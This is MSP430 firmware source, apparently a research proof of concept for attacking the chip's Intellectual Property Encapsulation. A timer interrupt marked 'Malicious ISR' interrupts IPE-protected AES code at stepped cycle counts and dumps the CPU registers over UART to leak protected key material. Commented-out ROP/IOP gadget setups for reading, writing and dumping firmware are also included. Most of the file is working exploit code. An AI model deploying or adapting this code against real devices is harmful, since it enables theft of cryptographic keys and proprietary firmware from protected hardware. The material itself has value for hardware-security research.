#include "test.h"

#include <stdint.h>
#include <string.h>

#include "msp430.h"

#include "pmm.h"

#include "experiment_time.h"

#include "cs.h"
#include "wdt_a.h"
#include "timer_b.h"
#include "sfr.h"
#include "gpio.h"
#include "eusci_a_uart.h"

#ifdef tiny_aes
#include "aes.h"
#endif

/** Globals (test inputs) **/
uint8_t key[] __attribute__((section(".ipe_vars"))) = { 0x60, 0x3d, 0xeb, 0x10, 0x15, 0xca, 0x71, 0xbe, 0x2b, 0x73,
                  0xae, 0xf0, 0x85, 0x7d, 0x77, 0x81, 0x1f, 0x35, 0x2c, 0x07,
                  0x3b, 0x61, 0x08, 0xd7, 0x2d, 0x98, 0x10, 0xa3, 0x09, 0x14,
                  0xdf, 0xf4 };

uint8_t pt[] __attribute__((section(".ipe_vars"))) = { 0x6b, 0xc1, 0xbe, 0xe2, 0x2e, 0x40, 0x9f, 0x96, 0xe9, 0x3d,
                 0x7e, 0x11, 0x73, 0x93, 0x17, 0x2a };
uint8_t ct[] __attribute__((section(".ipe_vars"))) = { 0x8d, 0x91, 0x58, 0x9b, 0xea, 0x81, 0x10, 0x5c, 0xdd, 0x0c,
                 0x45, 0x15, 0x45, 0xd0, 0x63, 0x0c };

/** contexts **/
#ifdef tiny_aes
struct AES_ctx __attribute__((section(".ipe_vars"))) ctx;
#endif

/** define keysizes **/
#if defined AES_128
#define keysize 128
#elif defined AES_192
#define keysize 192
#else
#define keysize 256
#endif


__attribute__((section(".ipe_code"))) void init_aes(void);
void init_aes()
{
__bic_SR_register(GIE);
__no_operation();

#ifdef tiny_aes
    AES_init_ctx(&ctx, key);
#endif

__bis_SR_register(GIE);
__no_operation();

/*
 * Clear General purpose CPU registers R4-R15
 */

__asm(" mov.w #0, R4");
__asm(" mov.w #0, R5");
__asm(" mov.w #0, R6");
__asm(" mov.w #0, R7");
__asm(" mov.w #0, R8");
__asm(" mov.w #0, R9");
__asm(" mov.w #0, R10");
__asm(" mov.w #0, R11");
__asm(" mov.w #0, R12");
__asm(" mov.w #0, R13");
__asm(" mov.w #0, R14");
__asm(" mov.w #0, R15");

}

__attribute__((section(".ipe_code"))) void test_encrypt(void);
void test_encrypt()
{
__bic_SR_register(GIE);
__no_operation();

#ifdef tiny_aes
    AES_encrypt(&ctx, key, pt, ct);
#endif

__bis_SR_register(GIE);
__no_operation();

/*
 * Clear General purpose CPU registers R4-R15
 */

__asm(" mov.w #0, R4");
__asm(" mov.w #0, R5");
__asm(" mov.w #0, R6");
__asm(" mov.w #0, R7");
__asm(" mov.w #0, R8");
__asm(" mov.w #0, R9");
__asm(" mov.w #0, R10");
__asm(" mov.w #0, R11");
__asm(" mov.w #0, R12");
__asm(" mov.w #0, R13");
__asm(" mov.w #0, R14");
__asm(" mov.w #0, R15");

}

__attribute__((section(".ipe_code"))) void test_decrypt(void);
void test_decrypt()
{
__bic_SR_register(GIE);
__no_operation();

#ifdef tiny_aes
    AES_decrypt(&ctx, key, ct, pt);
#endif

__bis_SR_register(GIE);
__no_operation();

__asm(" mov.w #0, R4");
__asm(" mov.w #0, R5");
__asm(" mov.w #0, R6");
__asm(" mov.w #0, R7");
__asm(" mov.w #0, R8");
__asm(" mov.w #0, R9");
__asm(" mov.w #0, R10");
__asm(" mov.w #0, R11");
__asm(" mov.w #0, R12");
__asm(" mov.w #0, R13");
__asm(" mov.w #0, R14");
__asm(" mov.w #0, R15");

}

int check_reset __attribute__((section(".persistent"))) = 0;
volatile unsigned int COMPARE_VALUE __attribute__((section(".persistent"))) = 0;    //41;
//volatile unsigned int IPE_ADDRESS __attribute__((section(".persistent"))) = 16383;
//volatile unsigned int ROP_ADDRESS __attribute__((section(".persistent"))) = 16500
//volatile unsigned int READ_ADDRESS __attribute__((section(".persistent"))) = 16510;
//volatile unsigned int ROP_MALWARE __attribute__((section(".persistent"))) = 0x8000;
//volatile unsigned int read_flag __attribute__((section(".persistent"))) = 0;

__attribute__((naked)) void increment_timer_count(void);
void increment_timer_count() {
    __asm__ __volatile__ ("inc &COMPARE_VALUE");
    __asm__ __volatile__ ("reta");
}

__attribute__((naked)) void IOP_gadget(void);
void IOP_gadget() {
    //__asm__ __volatile__ ("incx &0xf000");
    __no_operation();
    __no_operation();
    __no_operation();
    __no_operation();
    __no_operation();
    //__asm__ __volatile__ ("mov &0xf000,R14");
    __no_operation();
    __no_operation();
    //__asm__ __volatile__ ("bra #0x413a");
    __asm__ __volatile__ ("reta");
}

int main() {
    board_init();      /*Stop the watchdog timer*/

    if(check_reset == 0)
    {
        ++check_reset;
        //__asm__ __volatile__ ("mov &ROP_MALWARE, R9");
        //__asm__ __volatile__ ("mov.b #0x91, 0x0000(R9)");
        //__asm__ __volatile__ ("mov.b #0x02, 0x0001(R9)");
        //__asm__ __volatile__ ("mov.b #0xA3, 0x0002(R9)");
        //__asm__ __volatile__ ("mov.b #0xB4, 0x0003(R9)");
        //__asm__ __volatile__ ("mov.b #0xC5, 0x0004(R9)");
        //__asm__ __volatile__ ("mov.b #0xD6, 0x0005(R9)");
        //__asm__ __volatile__ ("mov.b #0xE7, 0x0006(R9)");
        //__asm__ __volatile__ ("mov.b #0xF8, 0x0007(R9)");
        PMM_trigBOR();
    }

    //COMPARE_VALUE++;
    increment_timer_count();

    //Set DCO Frequency to 1MHz
    CS_setDCOFreq(CS_DCORSEL_0,CS_DCOFSEL_0);

    //Set MCLK = SMCLK = DCO Frequency
    CS_initClockSignal(CS_SMCLK,CS_DCOCLK_SELECT,CS_CLOCK_DIVIDER_1);
    CS_initClockSignal(CS_MCLK,CS_DCOCLK_SELECT,CS_CLOCK_DIVIDER_1);

    // Configure UART pin
    //Set P2.0 as Secondary Module Function Input.

    //Select Port 2d
    //Set Pin 0 to input Secondary Module Function, (UCA0TXD/UCA0SIMO).

    GPIO_setAsPeripheralModuleFunctionInputPin(
    GPIO_PORT_P2,
    GPIO_PIN0,
    GPIO_SECONDARY_MODULE_FUNCTION
    );

    // Disable the GPIO power-on default high-impedance mode to activate
    // previously configured port settings
    PM5CTL0 &= ~LOCKLPM5;          //turn on I/O

    // Configure UART
    EUSCI_A_UART_initParam param = {0};
    param.selectClockSource = EUSCI_A_UART_CLOCKSOURCE_SMCLK;
    param.clockPrescalar = 8;
    param.firstModReg = 0;
    param.secondModReg = 0xD6;
    param.parity = EUSCI_A_UART_NO_PARITY;
    param.msborLsbFirst = EUSCI_A_UART_LSB_FIRST;
    param.numberofStopBits = EUSCI_A_UART_ONE_STOP_BIT;
    param.uartMode = EUSCI_A_UART_MODE;
    param.overSampling = EUSCI_A_UART_LOW_FREQUENCY_BAUDRATE_GENERATION;

    if (STATUS_FAIL == EUSCI_A_UART_init(EUSCI_A0_BASE, &param)) {
        return 0;
    }

    EUSCI_A_UART_enable(EUSCI_A0_BASE);

    /*set timer_B_parameters*/

    //Start timer in continuous mode sourced by SMCLK
    Timer_B_initContinuousModeParam initContParam = {0};
    initContParam.clockSource = TIMER_B_CLOCKSOURCE_SMCLK;
    initContParam.clockSourceDivider = TIMER_B_CLOCKSOURCE_DIVIDER_1;
    initContParam.timerInterruptEnable_TBIE = TIMER_B_TBIE_INTERRUPT_DISABLE;
    initContParam.timerClear = TIMER_B_DO_CLEAR;
    initContParam.startTimer = false;
    Timer_B_initContinuousMode(TIMER_B0_BASE, &initContParam);

    //Initiaze compare mode
    Timer_B_clearCaptureCompareInterrupt(TIMER_B0_BASE,
        TIMER_B_CAPTURECOMPARE_REGISTER_0);

    Timer_B_initCompareModeParam initCompParam = {0};
    initCompParam.compareRegister = TIMER_B_CAPTURECOMPARE_REGISTER_0;
    initCompParam.compareInterruptEnable = TIMER_B_CAPTURECOMPARE_INTERRUPT_ENABLE;
    initCompParam.compareOutputMode = TIMER_B_OUTPUTMODE_OUTBITVALUE;
    initCompParam.compareValue = COMPARE_VALUE;
    Timer_B_initCompareMode(TIMER_B0_BASE, &initCompParam);

    Timer_B_startCounter( TIMER_B0_BASE,
        TIMER_B_CONTINUOUS_MODE
        );

    //enable interrupts
    __bis_SR_register(GIE);       //need to enable LPM0 for timer_a to work properly
    __no_operation();

    /*Setup for memory-to-register operation detection*/

    /***
    __asm__ __volatile__ ("mov #0x6001,R4");
    __asm__ __volatile__ ("mov #0x602c,R5");
    __asm__ __volatile__ ("mov #0x6041,R6");
    __asm__ __volatile__ ("mov #0x6060,R7");
    __asm__ __volatile__ ("mov #0x6071,R8");
    __asm__ __volatile__ ("mov #0x6086,R9");
    __asm__ __volatile__ ("mov #0x6096,R10");
    __asm__ __volatile__ ("mov #0x60ab,R11");
    __asm__ __volatile__ ("mov #0x60b8,R12");
    __asm__ __volatile__ ("mov #0x60ca,R13");
    __asm__ __volatile__ ("mov #0x60e8,R14");
    __asm__ __volatile__ ("mov #0x6144,R15");
    __asm__ __volatile__ ("bra #0x412c");      //suspected instruction address location found from initial register dump and post-processing
    ***/

    /*End of setup*/

    /*Use 'write' IOP gadget for the odd numbered iterations and 'read' IOP gadget for the rest*

    __asm(" cmp #1,&read_flag");
    __asm(" jz read_gadget");

    *Setup for 'write' IOP gadget*

    __asm__ __volatile__ ("mov #1, &read_flag");
    __asm__ __volatile__ ("mov #29, &COMPARE_VALUE");
    __asm__ __volatile__ ("incx &ROP_ADDRESS");
    __asm__ __volatile__ ("mov &ROP_ADDRESS,SP");
    __asm__ __volatile__ ("mov &ROP_MALWARE, R9");
    __asm__ __volatile__ ("mov.b @R9,R13");
    __asm__ __volatile__ ("incx &ROP_MALWARE");
    __asm__ __volatile__ ("bra #0x48b2");

    *End of setup*

    *Setup for 'read' IOP gadget*

    //__asm__ __volatile__ ("incx &ROP_ADDRESS");
    __asm__ __volatile__ ("read_gadget: mov #0, &read_flag");
    __asm__ __volatile__ ("mov #41, &COMPARE_VALUE");
    //__asm__ __volatile__ ("mov &ROP_ADDRESS,R10");
    __asm__ __volatile__ ("incx &READ_ADDRESS");
    __asm__ __volatile__ ("mov &READ_ADDRESS,R10");
    __asm__ __volatile__ ("bra #0x4134");

    /*End of setup*/
    
    /*** Setup for fimrware dump IOP gadget ***/
    
    IOP_gadget();
    
    /*** End of setup ***/

    /******** Victim Code Start ********/

    /** initialize AES **/
    //init_aes();
    __asm__ __volatile__ ("suba #4,SP");
    __asm__ __volatile__ ("mova PC,R15");
    __asm__ __volatile__ ("adda #18,R15");
    __asm__ __volatile__ ("mova R15,@SP");
    __asm__ __volatile__ ("mova #init_aes,R14");
    __asm__ __volatile__ ("adda #2,R14");
    __asm__ __volatile__ ("bra R14");

    //test_encrypt();
    __asm__ __volatile__ ("suba #4,SP");
    __asm__ __volatile__ ("mova PC,R15");
    __asm__ __volatile__ ("adda #18,R15");
    __asm__ __volatile__ ("mova R15,@SP");
    __asm__ __volatile__ ("mova #test_encrypt,R14");
    __asm__ __volatile__ ("adda #2,R14");
    __asm__ __volatile__ ("bra R14");

    /******** Victim Code End ********/
    
    return 1;
}

/* Malicious ISR
 *
 * This ISR doesn't corrupt the register file,
 * besides PC,SP and SR which it is picking from
 * the stack.
 */

//volatile unsigned int dump_count __attribute__((section(".persistent"))) = 0;
volatile unsigned int DUMP_START[16] __attribute__((section(".altfram")));
void __attribute__((interrupt(TIMERB0_VECTOR),naked)) TIMERB0_ISR (void)
{
    //Saving Register States
    __asm(" addx #2, SP");
    __asm(" movx @SP, &DUMP_START");         //storing the PC
    __asm(" addx #2, SP");
    __asm(" movx SP, &DUMP_START+2");       //storing the SP
    __asm(" subx #4, SP");
    __asm(" movx @SP, &DUMP_START+4");      //storing the SR
    __asm(" movx R3, &DUMP_START+6");
    __asm(" movx R4, &DUMP_START+8");
    __asm(" movx R5, &DUMP_START+10");
    __asm(" movx R6, &DUMP_START+12");
    __asm(" movx R7, &DUMP_START+14");
    __asm(" movx R8, &DUMP_START+16");
    __asm(" movx R9, &DUMP_START+18");
    __asm(" movx R10, &DUMP_START+20");
    __asm(" movx R11, &DUMP_START+22");
    __asm(" movx R12, &DUMP_START+24");
    __asm(" movx R13, &DUMP_START+26");
    __asm(" movx R14, &DUMP_START+28");
    __asm(" movx R15, &DUMP_START+30");

    //__asm(" incx &dump_count");

    //UART TX Routine Start

    //not adding delay before next package (16 register states) Tx, as interrupt latency will handle that
    /*__asm(" mov #1000, R7");
    __asm(" big_start:  cmp #0,R7");
    __asm(" jz big_end");
    __asm(" dec R7");
    __asm(" jmp big_start");*/

    __asm(" mova #0, R14");
    __asm(" mov #16, R11");
    __asm(" serial_start:  cmp #0,R11");
    __asm(" jz serial_end");
    __asm(" mova #0x005CE, R12");                     //0x5CE is the address location of eUSCI_A0_UCA0TXBUF register (change acc to mem map)
    __asm(" movx.b 0x10001(R14), 0x00000(R12)");

    //add delay before next byte Tx
    __asm(" mov #15, R9");
    __asm(" inner_start:  cmp #0,R9");
    __asm(" jz inner_end");
    __asm(" dec R9");
    __asm(" jmp inner_start");

    __asm(" inner_end: mova #0x005CE, R12");         //0x5CE is the address location of eUSCI_A0_UCA0TXBUF register (change acc to mem map)
    __asm(" movx.b 0x10000(R14), 0x00000(R12)");

    //add delay before next word (2 bytes) Tx
    __asm(" mov #15, R10");
    __asm(" outer_start:  cmp #0,R10");
    __asm(" jz outer_end");
    __asm(" dec R10");
    __asm(" jmp outer_start");

    __asm(" outer_end: incdx.a R14");
    __asm(" dec R11");
    __asm(" jmp serial_start");
    //UART TX Routine End

    //Restoring PC, SP and SR
    __asm(" serial_end: mova #0x02BFC, SP");
    __asm(" nop ");
    __asm(" mova #0x00003, SR");
    __asm(" nop ");
    __asm(" bra #main");
    __asm__ __volatile__ ("capture_isr: jmp capture_isr");
}

#define IPE_SIG_VALID 0xFF88
// IPE signature valid flag
#define IPE_STR_PTR_SRC 0xFF8A
// Source for pointer (nibble address) to MPU IPE structure
//#pragma RETAIN(ipe_signalValid)
//#pragma location=IPE_SIG_VALID
const unsigned int ipe_signalValid __attribute__((retain, section(".ipesignature1"))) = 0xAAAA;
// Locate your IPE structure and it should be placed
// on the top of the IPE memory. In this example, IPE structure
// is at 0xD000
//#pragma RETAIN(IPE_stringPointerSourceSource)
//#pragma location=IPE_STR_PTR_SRC
const unsigned int IPE_stringPointerSourceSource __attribute__((retain, section(".ipesignature2"))) = 0x0400;

// IPE data structures definition, reusable for ALL projects
#define IPE_MPUIPLOCK 0x0080
#define IPE_MPUIPENA 0x0040
#define IPE_MPUIPPUC 0x0020
#define IPE_SEGREG(a) (a >> 4)
#define IPE_BIP(a,b,c) ((a) ^ (b) ^ (c) ^ (0xFFFF))
#define IPE_FILLSTRUCT(a,b,c) {a,IPE_SEGREG(b),IPE_SEGREG(c),IPE_BIP(a,IPE_SEGREG(b),IPE_SEGREG(c))}

typedef struct IPE_Init_Structure {
unsigned int MPUIPC0 ;
unsigned int MPUIPB2 ;
unsigned int MPUIPB1 ;
unsigned int MPUCHECK ;
} IPE_Init_Structure; // this struct should be placed inside IPB1/IPB2 boundaries
// This is the project dependant part
#define IPE_START 0x04000 // This defines the Start of the IP protected area
#define IPE_END 0x06000 // This defines the End of the IP protected area
// define borders of protected code
// ipestruct is defined in a adopted linker control file
// ipestruct is the section for protected data;
//#pragma RETAIN(ipe_configStructure)
//#pragma DATA_SECTION(ipe_configStructure,".ipestruct");
const IPE_Init_Structure ipe_configStructure __attribute__((retain, section(".ipestruct"))) = IPE_FILLSTRUCT(IPE_MPUIPLOCK + IPE_MPUIPENA, IPE_END,IPE_START);

